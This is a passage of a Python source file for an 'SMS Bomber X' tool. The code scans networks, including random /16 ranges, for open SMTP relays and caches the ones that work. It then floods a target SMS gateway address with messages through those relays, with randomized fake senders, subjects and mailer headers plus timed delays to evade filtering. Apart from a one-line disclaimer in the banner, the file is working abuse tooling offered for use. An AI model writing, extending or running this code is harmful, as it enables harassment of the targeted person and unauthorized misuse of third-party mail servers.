                    # We can try to cancel remaining *unsubmitted* targets implicitly by not submitting more
                    break # Stop submitting new jobs from the scan_targets list
                    
                future = executor.submit(test_single_relay, target, config.scan_timeout)
                futures.add(future)

            # --- Process Completed Futures ---
            log.debug(f"Submitted {len(futures)} scan tasks. Waiting for results...")
            # Use as_completed to process results as they become available
            for future in concurrent.futures.as_completed(futures):
                tested_count += 1
                
                # Check if progress task exists and is finished
                try:
                     if progress.tasks[task_scan_id].finished: 
                         log.debug("Scan task already marked finished, skipping further result processing.")
                         # Optional: Try cancelling this specific future if possible?
                         # future.cancel()
                         continue
                except IndexError:
                      log.warning("Scan progress task seems to be missing.")
                      break # Exit loop if progress tracking is lost

                try:
                    # Retrieve the result from the completed future
                    target_back, connection, status = future.result()
                    
                    # Update the RelayManager with the result 
                    # This handles adding to active pool if status == 'working'
                    relay_manager.add_or_update_relay(target_back['host'], target_back['port'], status, connection)
                    
                    if status == "working":
                        found_count += 1
                        log.debug(f"Found working relay #{found_count}: {target_back['host']}:{target_back['port']}")
                        # Update progress bar - description shows current found count
                        progress.update(task_scan_id, advance=1, description=f"[cyan]Scanning Relays ({found_count} Found)")
                        
                        # Check again if the pool target is met after processing this positive result
                        if not scan_stopped_early and config.relay_pool_target > 0 and len(relay_manager.active_relays) >= config.relay_pool_target:
                            log.info(f"Relay pool target ({config.relay_pool_target}) reached while processing results.")
                            scan_stopped_early = True
                            # Option 1: Just stop submitting new tasks (already done) and let others finish.
                            # Option 2: Try to shutdown executor more forcefully (might lose some results)
                            # if executor_instance:
                            #      log.info("Attempting early shutdown of scan executor...")
                            #      executor_instance.shutdown(wait=False, cancel_futures=True) 

                    else: # Test failed or resulted in non-working status
                        log.debug(f"Test for {target_back['host']}:{target_back['port']} resulted in status: {status}")
                        progress.update(task_scan_id, advance=1) # Still advance progress
                        
                except concurrent.futures.CancelledError:
                      log.debug("A scan task was cancelled.")
                      progress.update(task_scan_id, advance=1) # Advance progress for cancelled task
                except Exception as exc:
                    # Catch errors *during future result retrieval/processing*, not errors within test_single_relay
                    log.error(f'Error processing a scan result future: {exc}', exc_info=True)
                    progress.update(task_scan_id, advance=1) # Ensure progress advances

            # After loop finishes or breaks due to target reached
            log.debug("Finished processing completed scan futures.")


    except KeyboardInterrupt:
        log.warning("Scan interrupted by user (KeyboardInterrupt).")
        # Executor context manager will handle shutdown, potentially cancelling pending tasks
        # Ensure progress is stopped cleanly
        try:
             progress.stop() 
        except Exception: pass # Ignore errors stopping progress if already stopped
        raise # Re-raise KeyboardInterrupt for main app loop handling
        
    except Exception as e:
        log.critical(f"Critical error occurred during scan execution management: {e}", exc_info=True)
        try: 
            progress.stop() # Ensure progress stops on critical errors
        except Exception: pass
        # Let finally block handle cache save if possible

    finally:
        log.debug("Scan execution block finalizing.")
        # Ensure the progress task is updated and marked finished correctly
        try:
            if not progress.tasks[task_scan_id].finished:
                completed_count = progress.tasks[task_scan_id].completed
                total_count = progress.tasks[task_scan_id].total
                remaining = total_count - completed_count
                
                if scan_stopped_early:
                    final_desc = f"[yellow]Scan Halted ({len(relay_manager.active_relays)} Found - Target Met)"
                    # Advance progress for any remaining tasks that weren't processed due to early stop
                    progress.update(task_scan_id, advance=remaining, completed=total_count, description=final_desc)
                else:
                    final_desc = f"[cyan]Scan Completed ({len(relay_manager.active_relays)} Relays Found)"
                    progress.update(task_scan_id, completed=total_count, description=final_desc)
        except (IndexError, Exception) as fin_err:
             log.warning(f"Could not finalize scan progress task: {fin_err}")
             
    log.info(f"Relay scan phase complete. Found {len(relay_manager.active_relays)} working relays from {tested_count} tests performed.")
    # Save the cache after the scan finishes (or is interrupted/errored)
    relay_manager.save_cache()


# --- Bombing Logic ---
def run_bombing(config: AppConfig, relay_manager: RelayManager, progress: Progress) -> None:
    """Manages the process of sending messages using the discovered active relays."""
    
    # Pre-check: Ensure we have relays to work with
    if not relay_manager.active_relays:
        log.error("Cannot start bombing run: No active relays are available in the pool.")
        # Add a progress task to show bombing was skipped
        try: progress.add_task("[red]Bombing Skipped (No Relays)", total=1, completed=1)
        except Exception as e: log.error(f"Error adding skip task to progress: {e}")
        return

    # Pre-check: Load messages
    messages = load_messages(config.message_file)
    if not messages:
         log.error("Cannot start bombing run: No messages loaded (check file path or default list).")
         try: progress.add_task("[red]Bombing Skipped (No Messages)", total=1, completed=1)
         except Exception as e: log.error(f"Error adding skip task to progress: {e}")
         return

    # --- Setup Progress Bar Task for Bombing ---
    try:
         task_bomb_id = progress.add_task("[magenta]Sending Messages", total=config.message_count, start=True)
    except Exception as prog_err:
        log.error(f"Failed to add bombing task to progress bar: {prog_err}")
        return # Cannot proceed without progress task safely
        
    sent_count = 0
    failure_count_this_message = 0 # Count failures for the *current* message index being attempted
    total_consecutive_failures = 0 # Count overall failures without *any* success across all relays
    
    # Determine when to give up entirely - adjust multiplier as needed
    max_total_consecutive_failures_before_abort = max(5, len(relay_manager.active_relays) * 3) # At least 5, or 3x pool size
    max_failures_per_message_before_skip = max(3, len(relay_manager.active_relays) + 1) # Try each relay once + maybe retry a couple


    log.info(f"Starting bombing run: Target='{config.target_email}', Count={config.message_count}, Delay=({config.delay_min:.1f}-{config.delay_max:.1f}s)")
    log.info(f"Utilizing relay pool with {len(relay_manager.active_relays)} active server(s).")
    
    try:
        # Loop until the target number of messages are successfully sent
        # Using 'while' allows easier handling of retries for the same message index
        message_index_to_send = 0 # Use this to track which message number we are trying to send
        while message_index_to_send < config.message_count:
            
            current_attempt_number = message_index_to_send + 1 # For user display (1-based index)

            # --- Pre-attempt Checks ---
            if not relay_manager.active_relays:
                log.error("Relay pool became empty during bombing run. Aborting.")
                progress.update(task_bomb_id, description="[bold red]ABORTED (No Relays Left)")
                break # Exit the main while loop
            
            if total_consecutive_failures >= max_total_consecutive_failures_before_abort:
                 log.critical(f"Exceeded maximum total consecutive failure threshold ({max_total_consecutive_failures_before_abort}). Aborting bombing run.")
                 progress.update(task_bomb_id, description="[bold red]ABORTED (Too Many Failures)")
                 break # Exit the main while loop

            if failure_count_this_message >= max_failures_per_message_before_skip:
                 log.error(f"Failed to send message {current_attempt_number} after {failure_count_this_message} attempts. Skipping this message.")
                 # Skip this message index and move to the next
                 failure_count_this_message = 0 # Reset counter for the next message index
                 # Do NOT advance the main progress bar here for a skip
                 progress.update(task_bomb_id, description=f"[red]Skipped message {current_attempt_number}. Moving to {current_attempt_number + 1}...") 
                 message_index_to_send += 1 # Move to the next message index
                 time.sleep(0.5) # Small pause before trying next message index
                 continue # Continue to the next iteration of the while loop (next message index)

            # --- Get Relay for this attempt ---
            current_relay = relay_manager.get_next_active_relay()
            
            if not current_relay or not current_relay.connection:
                log.warning(f"Could not retrieve a working relay connection (Attempt {failure_count_this_message + 1} for Msg {current_attempt_number}). Waiting briefly...")
                time.sleep(0.5 + random.uniform(0, 0.5)) # Add small random jitter
                failure_count_this_message += 1 # Increment failure count for this message index
                total_consecutive_failures += 1 # Increment overall consecutive failures
                # Loop continues, will try again (possibly with same relay if only one left, or next)
                continue 

            # --- Got a relay, proceed ---
            host_port = f"{current_relay.host}:{current_relay.port}"
            log.debug(f"Attempting Msg {current_attempt_number}/{config.message_count} via relay {host_port}")
            progress.update(task_bomb_id, description=f"[magenta]Sending ({current_attempt_number}/{config.message_count}) via {host_port}")

            # --- Prepare Message ---
            # Generate fresh details for each send attempt
            try:
                from_local = random_string(random.randint(7, 11))
                # Generate more plausible domain names
                domain_part1 = random_string(random.randint(4, 7))
                domain_part2 = random.choice(['mail', 'email', 'svc', 'comms', 'sys'])
                domain_tld = random.choice(['com', 'net', 'org', 'info', 'online', 'xyz'])
                from_domain = f"{domain_part1}-{domain_part2}.{domain_tld}"
                from_email = f"{from_local}@{from_domain}"
                 
                message_body = random.choice(messages) # Select a random message
                 
                msg = MIMEMultipart('alternative')
                msg['From'] = f"{random_string(5)} <{from_email}>" # Optional "Real Name" part
                msg['To'] = config.target_email
                # Slightly more varied subjects
                subject_prefix = random.choice(["Re:", "Fwd:", "Status:", "Notification:", "", "Update:"])
                subject_body = random_string(random.randint(6, 12)).capitalize()
                msg['Subject'] = f"{subject_prefix} {subject_body} [{random.randint(100,999)}]" if subject_prefix else f"{subject_body} Report #{random.randint(1000,9999)}"
                 
                msg['Date'] = smtplib.email.utils.formatdate(localtime=True)
                msg['Message-ID'] = smtplib.make_msgid(domain=from_domain.split('.')[-2]+'.'+from_domain.split('.')[-1]) # Use base domain for msgid
                msg['X-Priority'] = str(random.choice([1, 3, 3, 3, 5])) # Skew towards normal priority
                msg['X-Mailer'] = random.choice([f"PHPMailer {random.uniform(5.0, 6.5):.1f}", f"SysMailer v{random.randint(1,3)}.{random.randint(0,9)}", ""]) # Common mailers or none

                # Ensure plain text part has UTF-8 encoding
                msg.attach(MIMEText(message_body, 'plain', 'utf-8')) 
                
                message_string = msg.as_string() # Final message to be sent

            except Exception as prep_err:
                log.error(f"Failed to prepare message {current_attempt_number}: {prep_err}. Retrying message preparation.", exc_info=True)
                failure_count_this_message += 1 
                total_consecutive_failures += 1
                time.sleep(0.5) # Pause before retrying preparation/send
                continue # Skip send attempt for this iteration, retry message from preparation step

            # --- Attempt Send using selected Relay ---
            try:
                log.debug(f"Executing sendmail from '{from_email}' to '{config.target_email}' via {host_port}")
                current_relay.connection.sendmail(from_email, [config.target_email], message_string) 
                
                # --- Success ---
                log.info(f"[bold green]SUCCESS[/]: Message {current_attempt_number}/{config.message_count} sent via {host_port}")
                sent_count = current_attempt_number # Update actual count of successfully sent messages
                failure_count_this_message = 0 # Reset failure counter for *this* message index
                total_consecutive_failures = 0 # Reset overall consecutive failure counter
                progress.update(task_bomb_id, advance=1, description=f"[magenta]Sent ({sent_count}/{config.message_count})") # Advance main progress bar

                # --- Move to Next Message Index ---
                message_index_to_send += 1 # Successfully sent, move to the next required message

                # --- Apply Dynamic Delay (if not the last message) ---
                if message_index_to_send < config.message_count: 
                    delay = random.uniform(config.delay_min, config.delay_max)
                    log.debug(f"Waiting for {delay:.2f} seconds before next message...")
                    # Update progress to show waiting status
                    progress.update(task_bomb_id, description=f"[magenta]Waiting {delay:.1f}s... ({sent_count}/{config.message_count} Sent)")
                    # Use time.sleep - cannot make progress bar sleep directly responsive easily
                    time.sleep(delay) 

            # --- Handle SMTP Send Errors ---
            except (smtplib.SMTPServerDisconnected, smtplib.SMTPResponseException, smtplib.SMTPConnectError, socket.error) as relay_err:
                log.warning(f"Relay {host_port} FAILED during send for msg {current_attempt_number}: {relay_err}. Marking relay failed.")
                relay_manager.mark_relay_failed(current_relay, reason=f"send_fail_{type(relay_err).__name__}")
                failure_count_this_message += 1
                total_consecutive_failures += 1
                # Do *not* advance message_index_to_send; retry this message number with next relay
                progress.update(task_bomb_id, description=f"[yellow]Relay {host_port} failed. Retrying message {current_attempt_number}...") 
                # Loop continues to try next relay for the same message index

            except smtplib.SMTPRecipientsRefused as e:
                 # Recipient refused by THIS relay. Might be target or relay issue.
                 log.error(f"Recipient '{config.target_email}' REFUSED by relay {host_port} for msg {current_attempt_number}. Error: {e}.")
                 # Let's mark this relay but allow trying OTHERS before aborting the whole run.
                 relay_manager.mark_relay_failed(current_relay, reason="recipient_refused_attempt") 
                 failure_count_this_message += 1
                 total_consecutive_failures += 1
                 progress.update(task_bomb_id, description=f"[yellow]Recipient Refused by {host_port}. Retrying msg {current_attempt_number} on other relays...")
                 # If *all* relays refuse the recipient, the skip mechanism should eventually trigger.

            except smtplib.SMTPSenderRefused as e:
                 log.warning(f"Sender '{from_email}' refused by {host_port} for msg {current_attempt_number}. Error: {e}. Marking relay failed & retrying.")
                 relay_manager.mark_relay_failed(current_relay, reason="sender_refused")
                 failure_count_this_message += 1
                 total_consecutive_failures += 1
                 progress.update(task_bomb_id, description=f"[yellow]Sender Refused by {host_port}. Retrying message {current_attempt_number}...")
                 # Loop continues

            except smtplib.SMTPDataError as e:
                 log.warning(f"SMTP 'DATA' command error sending via {host_port} for msg {current_attempt_number}. Error: {e}. Marking relay failed & retrying.")
                 relay_manager.mark_relay_failed(current_relay, reason="data_error")
                 failure_count_this_message += 1
                 total_consecutive_failures += 1
                 progress.update(task_bomb_id, description=f"[yellow]DATA Error via {host_port}. Retrying message {current_attempt_number}...")
                 # Loop continues
                 
            except Exception as e:
                 log.critical(f"Unexpected error during send attempt via {host_port} for msg {current_attempt_number}: {e}", exc_info=True)
                 # Mark relay failed for unexpected issues during send
                 relay_manager.mark_relay_failed(current_relay, reason="unexpected_send_error")
                 failure_count_this_message += 1
                 total_consecutive_failures += 1
                 progress.update(task_bomb_id, description=f"[red]Unexpected Error via {host_port}. Retrying msg {current_attempt_number}...")
                 # Allow retry mechanism to handle it, might eventually skip/abort


    except KeyboardInterrupt:
        log.warning("Bombing run interrupted by user (KeyboardInterrupt).")
        # Stop progress cleanly if possible
        try: progress.stop()
        except Exception: pass
        raise # Re-raise interrupt for main loop handling

    except Exception as e:
        # Catch unexpected errors in the bombing loop's control flow
        log.critical(f"Critical error during bombing execution control: {e}", exc_info=True)
        try: progress.stop()
        except Exception: pass

    finally:
        log.debug("Bombing execution block finishing.")
        # Update progress bar to final state based on actual sent count
        final_sent = sent_count # Actual number successfully sent
        try:
            # Check task still exists
            task_exists = any(task.id == task_bomb_id for task in progress.tasks)
            if task_exists and not progress.tasks[task_bomb_id].finished:
                 final_desc = f"[magenta]Bombing Finished ({final_sent}/{config.message_count} Sent)"
                 # Mark progress visually complete relative to the *target* count
                 progress.update(task_bomb_id, completed=config.message_count, description=final_desc) 
        except (IndexError, Exception) as fin_err:
             log.warning(f"Could not finalize bombing progress task: {fin_err}") 
              
        log.info(f"Bombing run ended. Total successfully sent: {final_sent}/{config.message_count}.")


# --- Profile Management ---
def list_profiles() -> List[str]:
    """Returns a sorted list of available profile names found in the profiles directory."""
    try:
        if PROFILES_DIR.is_dir():
            # Use glob to find files, check they are files, then get stem (name without ext)
            profile_files = [f.stem for f in PROFILES_DIR.glob("*.json") if f.is_file()]
            return sorted(profile_files) # Sort alphabetically
        else:
            log.debug(f"Profiles directory does not exist: {PROFILES_DIR}")
            return []
    except OSError as e:
         log.error(f"Error accessing profiles directory {PROFILES_DIR}: {e}")
         return []

def load_profile(profile_name: str) -> Optional[AppConfig]:
    """Loads an AppConfig object from a specified profile JSON file."""
    if not profile_name: 
        log.warning("Attempted to load profile with empty name.")
        return None
        
    profile_path = PROFILES_DIR / f"{profile_name}.json"
    if profile_path.is_file():
        try:
            log.debug(f"Loading profile from: {profile_path}")
            with open(profile_path, 'r', encoding='utf-8') as f:
                config_dict = json.load(f)
            
            # Create a default AppConfig instance to populate
            config = AppConfig() 
            loaded_keys_count = 0
            known_keys = AppConfig.__annotations__.keys() # Get expected keys from dataclass

            for key, value in config_dict.items():
                if key in known_keys:
                    # Perform basic type validation or conversion if necessary
                    try:
                        expected_type = AppConfig.__annotations__.get(key)
                        # Handle potential type mismatches from JSON (e.g., int saved as float)
                        # This needs careful consideration for complex types (like List[int])
                        current_value = getattr(config, key)
                        value_type = type(current_value) if current_value is not None else expected_type # Target type
                        
                        if value_type == float and isinstance(value, (int, float)): value = float(value)
                        elif value_type == int and isinstance(value, (int, float)): value = int(value) # Truncation risk
                        elif value_type == bool and isinstance(value, (int, bool)): value = bool(value)
                        # Add more checks for List etc. if required, or rely on exceptions
                        
                        setattr(config, key, value)
                        loaded_keys_count += 1
                    except (TypeError, ValueError) as type_err:
                         log.warning(f"Type mismatch or conversion error for key '{key}' in profile '{profile_name}'. Using default value. Error: {type_err}")
                else:
                    log.warning(f"Ignoring unknown key '{key}' found in profile '{profile_name}'.")
            
            # Ensure the profile name in the loaded config matches the filename stem
            config.profile_name = profile_name 
            log.info(f"Successfully loaded {loaded_keys_count} settings from profile '{profile_name}'.")
            return config
            
        except (json.JSONDecodeError, IOError, TypeError) as e:
            log.error(f"Failed to load or parse profile file '{profile_path}': {e}")
            return None
        except Exception as e:
             log.error(f"Unexpected error loading profile '{profile_name}': {e}", exc_info=True)
             return None
    else:
        log.warning(f"Profile file not found: '{profile_path}'")
        return None

def save_profile(config: AppConfig) -> bool:
    """Saves the current AppConfig object to a profile JSON file. Returns True on success."""
    
    # Validate profile name before attempting to save
    # Allow letters, numbers, space, underscore, hyphen, dot
    profile_name_regex = r"^[a-zA-Z0-9_\-. ]+$" 
    profile_name_to_save = config.profile_name.strip() # Remove leading/trailing whitespace
    
    # Check for invalid or empty name
    if not profile_name_to_save or not re.match(profile_name_regex, profile_name_to_save) or profile_name_to_save.lower() == '[none]':
        log.error(f"Invalid profile name provided: '{config.profile_name}'. Cannot save.")
        console.print(f"[red]Error:[/red] Profile name '{config.profile_name}' is invalid.")
        # Ask interactively for a valid name
        new_name = Prompt.ask(
            "[yellow]Enter a valid name for the profile (letters, numbers, spaces, -, _, .):[/yellow]", 
            default="new_profile" # Provide a default
            ).strip()
            
        # Re-validate the entered name
        if not new_name or not re.match(profile_name_regex, new_name) or new_name.lower() == '[none]':
             log.error(f"Still invalid profile name: '{new_name}'. Aborting profile save.")
             console.print("[red]Save cancelled due to invalid name.[/red]")
             return False # Indicate save failure
             
        # Update the config object AND the name to use for saving
        config.profile_name = new_name 
        profile_name_to_save = new_name 
        
    # Proceed with saving using the validated name
    profile_path = PROFILES_DIR / f"{profile_name_to_save}.json"
    log.debug(f"Saving profile configuration to: {profile_path}")
    
    try:
        # Convert the dataclass object to a dictionary for JSON serialization
        # Using vars() is simple for basic dataclasses
        config_dict = vars(config) 
        
        # Ensure the profiles directory exists (redundant check, but safe)
        profile_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Write the dictionary to the JSON file with UTF-8 encoding and indentation
        with open(profile_path, 'w', encoding='utf-8') as f:
            json.dump(config_dict, f, indent=2, ensure_ascii=False) # Indent for readability
            
        log.info(f"Configuration successfully saved as profile '{profile_name_to_save}'.")
        console.print(f"[green]Profile '{profile_name_to_save}' saved.[/green]")
        return True # Indicate success
        
    except (IOError, TypeError, OSError) as e:
        log.error(f"Failed to save profile '{profile_name_to_save}': {e}")
        console.print(f"[red]Error saving profile: {e}[/red]")
        return False # Indicate failure
    except Exception as e:
         log.error(f"Unexpected error saving profile '{profile_name_to_save}': {e}", exc_info=True)
         console.print(f"[red]Unexpected error saving profile. Check logs.[/red]")
         return False # Indicate failure

def get_user_config_interactive() -> Optional[AppConfig]:
    """Interactively gathers configuration settings from the user, allows loading/saving profiles."""
    
    # Start with a default configuration object
    config = AppConfig() 
    
    console.print(Panel("SMS Bomber X Configuration", title="[bold cyan]Setup[/]", style="cyan", border_style="cyan", padding=(1,2)))
    
    # --- Offer to Load Existing Profile ---
    available_profiles = list_profiles()
    if available_profiles:
        # Add '[none]' as the first choice to allow creating new config
        profile_choices = ["[none]"] + available_profiles 
        load_choice = Prompt.ask(
            "Load existing profile or create new?", 
            choices=profile_choices, 
            default="[none]" # Default is to not load a profile
        )
        if load_choice != "[none]":
            loaded_config = load_profile(load_choice)
            if loaded_config:
                # Ask user if they want to use the loaded settings directly
                use_loaded = Confirm.ask(f"Use settings from profile [green]'{load_choice}'[/]?", default=True)
                if use_loaded:
                    console.print(f"[green]Using configuration from profile '{load_choice}'.[/green]")
                    return loaded_config # Return the loaded config and skip interactive setup

                # User wants to modify the loaded profile settings
                config = loaded_config # Start modification from the loaded settings
                console.print(f"[yellow]Modifying settings loaded from profile '{load_choice}'.[/yellow]")
            else:
                 # Loading failed, inform user and proceed with default manual config
                 console.print(f"[red]Failed to load profile '{load_choice}'.[/red] Starting new configuration.")
                 # Fall through to manual config using the default `config` object
    else:
         # Corrected Markup Error: Removed '[i]' tag, used explicit '[/blue]' close
         console.print("[blue]No existing profiles found. Starting new configuration.[/blue]")

    # --- Gather Configuration Details Interactively ---
    # Use Panels to group related settings visually
    console.print(Panel("Target & Message Settings", style="magenta", title_align="left", border_style="magenta"))

    # Target Email
    while True:
        # Display current value from config (could be default or loaded profile)
        current_target_display = f" (current: [cyan]{config.target_email}[/])" if config.target_email else ""
        target_input = Prompt.ask(f"Enter target SMS gateway address{current_target_display}", default=config.target_email)
        if validate_email(target_input):
            config.target_email = target_input.strip() # Store stripped value
            break # Exit loop on valid email
        else:
            console.print("[prompt.invalid]Invalid email address format. Please try again.")

    # Message Count
    config.message_count = IntPrompt.ask("Number of messages to send", default=config.message_count)
    if config.message_count < 1: config.message_count = 1 # Ensure at least 1 message
    
    # Dynamic Delay using FloatPrompt
    console.print("\n[i]Delay between messages (randomized):[/i]")
    config.delay_min = FloatPrompt.ask(" Minimum delay (seconds)", default=config.delay_min)
    config.delay_max = FloatPrompt.ask(" Maximum delay (seconds)", default=config.delay_max)
    # Validate and adjust delays
    if config.delay_min < 0: config.delay_min = 0.0 # Non-negative
    if config.delay_max < config.delay_min:
        console.print(f"[yellow]Warning:[/yellow] Maximum delay ({config.delay_max:.1f}s) was less than minimum ({config.delay_min:.1f}s). Adjusting max delay.")
        config.delay_max = config.delay_min + max(1.0, config.delay_min * 0.5) # Ensure max is reasonably larger
        console.print(f"  New maximum delay: [green]{config.delay_max:.1f}s[/green]")

    # Custom Message File Path
    current_msg_file_display = f" (current: [cyan]{config.message_file}[/])" if config.message_file else " (current: [dim]use defaults[/dim])"
    use_custom_file = Confirm.ask(f"Use custom message file?{current_msg_file_display}", default=bool(config.message_file))
    if use_custom_file:
        default_path = config.message_file if config.message_file else "messages.txt" # Suggest current or default filename
        file_input = Prompt.ask(" Enter path to message file", default=default_path)
        message_path = Path(file_input.strip()) # Strip whitespace from path
        # Provide immediate feedback if the file doesn't seem to exist
        if not message_path.exists(): # Check if path exists at all
            console.print(f"[yellow]Warning:[/yellow] Path '{message_path}' doesn't exist.")
        elif not message_path.is_file():
            console.print(f"[yellow]Warning:[/yellow] Path '{message_path}' exists but is not a regular file (e.g., it's a directory).")
        config.message_file = str(message_path) # Store path as string
    else:
        config.message_file = None # Ensure it's None if not using custom file

    # --- Scanner Settings ---
    console.print(Panel("Relay Scanner Settings", style="blue", title_align="left", border_style="blue"))

    # SMTP Ports to Scan
    ports_input = Prompt.ask("Enter SMTP ports to scan (comma-separated)", default=",".join(map(str, config.scan_ports)))
    config.scan_ports = parse_ports(ports_input)

    # Scan Target (Range/Host/IP or Blank for Random)
    current_range_display = f" (current: [cyan]{config.scan_range_raw}[/])" if config.scan_range_raw else " (current: [dim]random /16[/dim])"
    config.scan_range_raw = Prompt.ask(f"Enter scan target (hostname, IP, CIDR, or blank){current_range_display}", default=config.scan_range_raw).strip()
    
    # Scan Parameters
    config.scan_timeout = IntPrompt.ask(" Connection timeout per relay (seconds)", default=config.scan_timeout)
    if config.scan_timeout < 1: config.scan_timeout = 1 # Minimum timeout
    
    config.scan_workers = IntPrompt.ask(" Max concurrent scan workers", default=config.scan_workers)
    if config.scan_workers < 1: config.scan_workers = 1 # Minimum workers

    config.relay_pool_target = IntPrompt.ask(" Stop scan after finding N working relays (0=scan all targets)", default=config.relay_pool_target)
    if config.relay_pool_target < 0: config.relay_pool_target = 0 # 0 means scan everything specified

    # --- Cache and Log Settings ---
    console.print(Panel("Cache & Prioritization", style="yellow", title_align="left", border_style="yellow"))
    config.use_relay_cache = Confirm.ask(f"Use relay cache file ([cyan]{RELAY_CACHE_FILE.name}[/])?", default=config.use_relay_cache)
    # Display hint about legacy log if it exists
    legacy_log_exists = Path("open_smtp_servers.log").exists()
    legacy_log_hint = " ([dim]legacy file found[/dim])" if legacy_log_exists else ""
    config.load_previous_log = Confirm.ask(f"Prioritize relays from 'open_smtp_servers.log'?{legacy_log_hint}", default=(config.load_previous_log and legacy_log_exists))
    
    # --- Save Configuration as Profile ---
    console.print(Panel("Save Configuration", style="green", title_align="left", border_style="green"))
    save_is_requested = Confirm.ask("Save this configuration as a profile?", default=False)
    if save_is_requested:
        # Use current profile name as default suggestion if modifying one
        profile_name_prompt = Prompt.ask("Enter profile name to save as", default=config.profile_name) 
        config.profile_name = profile_name_prompt.strip() # Update config with potentially new name
        # save_profile now handles validation and user feedback internally
        save_profile(config) 
    else:
        log.info("Configuration not saved as a profile for this run.")

    console.print("[bold green]Configuration complete.[/bold green]")
    return config


# --- Main Application Logic ---
def display_banner():
    """Prints the application banner and informational panel."""
    # Raw string for banner to preserve backslashes
    banner = r"""[bold cyan]
# __________                  __             __     ________             .___ 
# \______   \  ____    ____  |  | __  ____ _/  |_  /  _____/   ____    __| _/ 
#  |       _/ /  _ \ _/ ___\ |  |/ /_/ __ \\   __\/   \  ___  /  _ \  / __ |  
#  |    |   \(  <_> )\  \___ |    < \  ___/ |  |  \    \_\  \(  <_> )/ /_/ |  
#  |____|_  / \____/  \___  >|__|_ \ \___  >|__|   \______  / \____/ \____ |  
#         \/              \/      \/     \/               \/              \/  
[/]
[bold blue] SMS Bomber X - Enhanced Edition [/]
[i yellow] Disclaimer: Use responsibly, ethically, and only with explicit permission. [/]"""
    # Use Panel.fit to allow the panel to size naturally around the banner content
    console.print(Panel.fit(banner, border_style="blue", padding=(0,1))) 
    
    # Display resolved paths for clarity
    try:
         info_text = (
              f"Log File : [dim cyan]{LOG_FILE.resolve()}[/]\n"
              f"Profiles : [dim cyan]{PROFILES_DIR.resolve()}[/]\n"
              f"Cache File: [dim cyan]{RELAY_CACHE_FILE.resolve()}[/]"
         )
         console.print(Panel(info_text, title="[bold]Paths[/]", style="dim", border_style="yellow", expand=False, padding=(0,1)))
    except Exception as path_err:
         log.warning(f"Could not display resolved paths: {path_err}")


def main_app():
    """Main function to orchestrate the SMS Bomber X application."""
    # Show banner first for visual appeal and disclaimer
    display_banner() 
    
    # --- Global Progress Bar Setup ---
    # Customize columns for a clean look
    progress = Progress(
        TextColumn("[progress.description]{task.description}", justify="left"),
        BarColumn(bar_width=None), # Adapts to console width
        TextColumn("[progress.percentage]{task.percentage:>3.1f}%"),
        SpinnerColumn(spinner_name="line", style="cyan"), # Different spinner example
        TextColumn("•", style="dim"),
        TimeRemainingColumn(),
        TextColumn("•", style="dim"),
        TimeElapsedColumn(),
        console=console,
        transient=False, # Keep completed tasks visible
        expand=True # Let progress bars use available width
    )

    # Initialize state variables
    config: Optional[AppConfig] = None
    relay_manager: Optional[RelayManager] = None
    previous_log_relays: List[str] = []

    # --- Load legacy log file contents early (if it exists) ---
    # This simple file doesn't need complex error handling like JSON cache
    old_log_path = Path("open_smtp_servers.log")
    if old_log_path.is_file():
        try:
            with open(old_log_path, 'r', encoding='utf-8') as f:
                # Basic filter for lines containing a colon (potential ip:port)
                previous_log_relays = [line.strip() for line in f if line.strip() and ':' in line]
            if previous_log_relays:
                log.info(f"Found {len(previous_log_relays)} potential relay entries in legacy 'open_smtp_servers.log'. Will consider if enabled in config.")
            else:
                log.info("Legacy 'open_smtp_servers.log' found but was empty or contained no valid entries.")
        except Exception as e:
             log.warning(f"Could not read legacy log file '{old_log_path}': {e}")

    # --- Main Execution Block ---
    try:
        # --- Initialize Core Components ---
        # Relay Manager needs cache file path and console instance
        relay_manager = RelayManager(RELAY_CACHE_FILE, console)
        
        # --- Get Configuration (Interactive) ---
        # This function handles loading profiles or prompting the user
        config = get_user_config_interactive()
        
        # Check if configuration was successful
        if not config: 
             console.print("[bold red]Configuration process failed or was cancelled by the user. Exiting.[/]")
             # No cleanup needed yet as operations haven't started
             return 

        # --- Start Operations within Live Context Manager ---
        # This keeps the progress bars visible and updated
        console.print("\n", Panel("[bold green]Starting Operations...[/]", expand=False, style="green", border_style="green", padding=(0,1)))
        with Live(progress, refresh_per_second=5, console=console, vertical_overflow="crop", transient=False) as live:
            # `live` object can be used to update display if needed, progress updates automatically

            # --- Step 1: Scan for SMTP Relays ---
            run_scan(
                config, 
                relay_manager, 
                previous_log_relays if config.load_previous_log else [], # Pass legacy ips only if enabled
                progress
                )
            # live.update(progress) # Explicit update might help ensure display sync after scan

            # --- Step 2: Run the Bombing Process ---
            # Check if the scan found any usable relays
            if relay_manager.active_relays:
                console.print("\n") # Add visual spacing before confirmation
                # Ask for confirmation before proceeding with bombing
                start_bombing = Confirm.ask(
                    f"\n[bold green]Scan complete.[/] Found [bold]{len(relay_manager.active_relays)}[/] working relays. [bold]Start bombing run?[/]", 
                    default=True # Default to yes for convenience
                )
                if start_bombing:
                    run_bombing(config, relay_manager, progress)
                else:
                    console.print("[yellow]Bombing run explicitly cancelled by user.[/yellow]")
                    # Add a progress task indicating cancellation
                    progress.add_task("[yellow]Bombing Cancelled", total=1, completed=1)
            else:
                 # This message is shown if the scan completed but found 0 relays
                 console.print("\n[bold red]Scan finished, but no working relays are currently available in the pool.[/]")
                 # Add a progress task indicating skipping
                 progress.add_task("[red]Bombing Skipped (No Active Relays)", total=1, completed=1)

            # Optional: Brief pause to ensure user sees the final progress state
            # time.sleep(1.5)

    except KeyboardInterrupt:
        # Handle Ctrl+C gracefully anywhere in the main flow
        console.print("\n[bold yellow]Operation interrupted by user (Ctrl+C). Shutting down...[/]")
        log.warning("Operation manually interrupted via KeyboardInterrupt.")
    except MarkupError as markup_err:
         console.print(f"\n[bold red]UI Error:[/bold red] Invalid text markup detected.")
         log.critical(f"Rich Markup Error encountered: {markup_err}", exc_info=True)
         console.print_exception(show_locals=False) # Show traceback for UI error
    except Exception as e:
        # Catch any other unexpected exceptions during setup or execution
        console.print("\n[bold red]An unexpected critical error occurred![/]")
        log.critical("Critical error in main application execution:", exc_info=True)
        # Display the full traceback on the console for detailed debugging
        console.print_exception(show_locals=True, width=console.width, word_wrap=True) 
        
    finally:
        # --- Cleanup Actions ---
        # This block executes regardless of whether an error occurred or not
        console.print("\n", Panel("[bold cyan]Initiating shutdown procedure...[/]", style="cyan", border_style="cyan", padding=(0,1)))
        
        # Safely close relay connections and save cache
        if relay_manager:
            try:
                # Close active connections first
                relay_manager.close_all_connections() 
            except Exception as close_err:
